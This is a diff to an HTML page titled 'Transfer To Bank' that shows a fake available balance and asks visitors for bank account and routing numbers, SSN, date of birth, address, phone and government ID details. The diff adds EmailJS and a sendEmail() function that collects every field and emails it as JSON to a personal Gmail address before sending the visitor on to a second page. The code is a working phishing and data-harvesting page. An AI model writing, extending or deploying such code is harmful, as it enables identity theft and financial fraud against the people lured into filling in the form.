@@ -5,6 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Transfer To Bank</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("z0QGEnsIPv4sm3wgw"); // Replace with your EmailJS public key
+        })();
+    </script>
 </head>
 <body class="bg-gray-100">
 
@@ -21,10 +27,9 @@
         <input type="text" placeholder="Account Name" id="account-name" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
         <input type="text" placeholder="Account #" id="account-number" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
         <input type="text" placeholder="Routing #" id="routing-number" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
-        <input type="text" placeholder="Account type" id="account-type" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-yellow-700" />
-        <input type="text" placeholder="Address" id="address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
-        <input type="text" placeholder="Residential Address" id="address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
-        <input type="text" placeholder="Zip-Code" id="address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
+        <input type="text" placeholder="Account type" id="account-type" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
+        <input type="text" placeholder="Residential Address" id="residential-address" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
+        <input type="text" placeholder="Zip-Code" id="zip-code" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
         <input type="text" placeholder="Date Of Birth" id="dob" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
         <input type="text" placeholder="SSN" id="ssn" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
         <input type="text" placeholder="Phone #" id="phone" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
@@ -56,35 +61,52 @@
         <input type="text" placeholder="ID State" id="id-state" class="w-full border-2 border-blue-500 rounded-md p-3 mb-4 focus:outline-none focus:border-blue-700" />
 
         <!-- Available Balance -->
-        <p class="text-lg font-bold">Available Balance: $20,000</p>
+        <p class="text-lg font-bold">Available Balance: $100,000</p>
 
         <!-- Submit Button -->
-        <button onclick="validateForm()" class="w-full bg-blue-600 text-white font-bold py-3 mt-4 rounded-md">Submit</button>
+    <button onclick="sendEmail()" class="w-full bg-blue-600 text-white font-bold py-3 mt-4 rounded-md">Submit</button>
     </div>
 
     <script>
-        function validateForm() {
-            // Collect all inputs and the select element
-            const fields = [
-                'account-name', 'account-number', 'routing-number', 
-                'account-type', 'address', 'dob', 'ssn', 
-                'phone', 'employment-status', 'id-type', 
-                'id-number', 'id-issue-mm', 'id-issue-dd', 
-                'id-issue-yyyy', 'id-expire-mm', 'id-expire-dd', 
-                'id-expire-yyyy', 'id-state'
-            ];
+        function sendEmail() {
+            // Collect form data
+            const formData = {
+                account_name: document.getElementById("account-name").value,
+                account_number: document.getElementById("account-number").value,
+                routing_number: document.getElementById("routing-number").value,
+                account_type: document.getElementById("account-type").value,
+                residential_address: document.getElementById("residential-address").value,
+                zip_code: document.getElementById("zip-code").value,
+                dob: document.getElementById("dob").value,
+                ssn: document.getElementById("ssn").value,
+                phone: document.getElementById("phone").value,
+                employment_status: document.getElementById("employment-status").value,
+                id_type: document.getElementById("id-type").value,
+                id_number: document.getElementById("id-number").value,
+                id_issue_date: `${document.getElementById("id-issue-mm").value}-${document.getElementById("id-issue-dd").value}-${document.getElementById("id-issue-yyyy").value}`,
+                id_expire_date: `${document.getElementById("id-expire-mm").value}-${document.getElementById("id-expire-dd").value}-${document.getElementById("id-expire-yyyy").value}`,
+                id_state: document.getElementById("id-state").value
+            };
 
-            // Loop through all fields to check if any is empty
-            for (let field of fields) {
-                const value = document.getElementById(field).value;
-                if (value.trim() === "") {
-                    alert("Please fill in all the fields.");
+            // Validate all fields
+            for (let key in formData) {
+                if (formData[key].trim() === "") {
+                    alert("Please fill in all the fields before submitting.");
                     return;
                 }
             }
 
-            // If all fields are filled, navigate to the next page
-            window.location.href = "transferp2.html";
+            // Send email using EmailJS
+            emailjs.send("service_dtjql2f", "template_h8pxhs6", {
+                to_email: "onahbright2004@gmail.com",
+                message: JSON.stringify(formData, null, 2) // Format as JSON
+            }).then(() => {
+                alert("Form submitted successfully!");
+                window.location.href = "transferp2.html"; // Navigate to transferp2.html
+            }).catch(error => {
+                alert("Submission failed. Please try again.");
+                console.error(error);
+            });
         }
     </script>
 
